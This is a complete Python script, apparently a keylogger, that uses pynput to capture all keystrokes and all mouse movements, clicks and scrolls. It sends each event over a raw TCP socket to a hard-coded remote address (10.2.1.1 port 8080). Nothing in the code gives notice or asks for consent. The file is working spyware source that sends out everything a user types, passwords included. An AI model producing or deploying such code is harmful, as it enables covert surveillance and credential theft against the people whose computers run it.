import socket
from pynput import keyboard, mouse

# Define the server address and port
server_address = ('10.2.1.1', 8080)

# Function to send data to the server
def send_data(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect(server_address)
            sock.sendall(data.encode('utf-8'))
    except Exception as e:
        print(f"Error sending data: {e}")

# Callback function for keyboard events
def on_press(key):
    try:
        send_data(f"Key pressed: {key.char}")
    except AttributeError:
        send_data(f"Special key pressed: {key}")

# Callback function for mouse events
def on_move(x, y):
    send_data(f"Mouse moved to ({x}, {y})")

def on_click(x, y, button, pressed):
    if pressed:
        send_data(f"Mouse clicked at ({x}, {y}) with {button}")
    else:
        send_data(f"Mouse released at ({x}, {y}) with {button}")

def on_scroll(x, y, dx, dy):
    send_data(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy})")

# Start listening to keyboard and mouse events
with keyboard.Listener(on_press=on_press) as keyboard_listener, \
     mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as mouse_listener:
    keyboard_listener.join()
    mouse_listener.join()
